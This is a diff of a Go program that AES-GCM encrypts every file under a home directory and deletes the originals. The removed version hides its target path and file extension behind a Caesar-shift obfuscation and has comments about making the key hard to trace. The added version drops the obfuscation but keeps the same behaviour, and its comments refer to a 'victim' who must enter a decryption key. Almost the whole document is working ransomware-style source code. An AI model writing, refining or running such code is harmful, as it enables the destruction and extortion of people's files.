@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bufio"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -10,37 +9,33 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
-	"syscall"
-	"unsafe"
 )
 
-// Random string encoding untuk obfuscasi lebih lanjut
-func decodeString(s string) string {
-	r := ""
-	for _, c := range s {
-		r += string(c - 3) // Menggunakan Caesar cipher sederhana sebagai contoh
-	}
-	return r
-}
-
-func encFile(path string, gcm cipher.AEAD) {
+// Function to encrypt a file
+func encryptFile(path string, gcm cipher.AEAD) {
 	original, err := os.ReadFile(path)
 	if err != nil {
+		fmt.Println("Error while reading file:", err)
 		return
 	}
 
 	nonce := make([]byte, gcm.NonceSize())
 	io.ReadFull(rand.Reader, nonce)
-
 	encrypted := gcm.Seal(nonce, nonce, original, nil)
 
-	os.WriteFile(path+decodeString("_hqc"), encrypted, 0666)
-	os.Remove(path)
+	err = os.WriteFile(path+".enc", encrypted, 0666)
+	if err != nil {
+		fmt.Println("Error while writing encrypted file:", err)
+	} else {
+		os.Remove(path)
+	}
 }
 
-func decFile(path string, gcm cipher.AEAD) {
+// Function to decrypt a file
+func decryptFile(path string, gcm cipher.AEAD) {
 	encrypted, err := os.ReadFile(path)
 	if err != nil {
+		fmt.Println("Error while reading encrypted file:", err)
 		return
 	}
 
@@ -48,46 +43,83 @@ func decFile(path string, gcm cipher.AEAD) {
 	encrypted = encrypted[gcm.NonceSize():]
 	original, err := gcm.Open(nil, nonce, encrypted, nil)
 	if err != nil {
+		fmt.Println("Error while decrypting file:", err)
 		return
 	}
 
-	os.WriteFile(path[:len(path)-4], original, 0666)
-	os.Remove(path)
+	err = os.WriteFile(path[:len(path)-4], original, 0666)
+	if err != nil {
+		fmt.Println("Error while writing decrypted file:", err)
+	} else {
+		os.Remove(path)
+	}
 }
 
-func main() {
-	fmt.Print("Masukkan passphrase: ")
-	scanner := bufio.NewScanner(os.Stdin)
-	scanner.Scan()
-	passphrase := scanner.Text()
-
-	// Mengacak urutan kunci agar sulit dilacak
-	key := []byte(passphrase)
-	for i := range key {
-		key[i] ^= 0xAA // XOR sederhana
-	}
-
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return
-	}
-
-	filepath.Walk(decodeString("03jh/home"), func(path string, info os.FileInfo, err error) error {
+// Function to process files (encrypt or decrypt)
+func processFiles(action string, gcm cipher.AEAD) {
+	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
 		if err != nil {
-			return err
+			fmt.Println("Error while walking file path:", err)
+			return nil
 		}
+
 		if !info.IsDir() {
-			if strings.HasSuffix(path, decodeString("_hqc")) {
-				decFile(path, gcm)
-			} else {
-				encFile(path, gcm)
+			if strings.HasSuffix(path, ".enc") && action == "decrypt" {
+				fmt.Println("Decrypting " + path + "...")
+				decryptFile(path, gcm)
+			} else if !strings.HasSuffix(path, ".enc") && action == "encrypt" {
+				fmt.Println("Encrypting " + path + "...")
+				encryptFile(path, gcm)
 			}
 		}
 		return nil
 	})
+}
+
+// Function to get the AES key (hardcoded)
+func getKey() (cipher.AEAD, error) {
+	// Ask for the decryption key (the victim needs to enter it after files are encrypted)
+	fmt.Print("Enter decryption key: ")
+	var key string
+	fmt.Scanln(&key)
+
+	// Use the entered key for AES encryption
+	keyBytes := []byte(key)
+	block, err := aes.NewCipher(keyBytes)
+	if err != nil {
+		return nil, err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+
+	return gcm, nil
+}
+
+func main() {
+	// Automatically encrypt the files when the program starts
+	gcm, err := getKey()
+	if err != nil {
+		fmt.Println("Error setting up AES:", err)
+		return
+	}
+
+	// Encrypt all files
+	fmt.Println("Encrypting files...")
+	processFiles("encrypt", gcm)
+
+	// Ask for the decryption key after encryption
+	fmt.Println("\nFiles encrypted. Please enter the decryption key to unlock your files.")
+
+	// Decrypt files after key is provided
+	gcm, err = getKey()
+	if err != nil {
+		fmt.Println("Error setting up AES for decryption:", err)
+		return
+	}
+
+	fmt.Println("Decrypting files...")
+	processFiles("decrypt", gcm)
 }
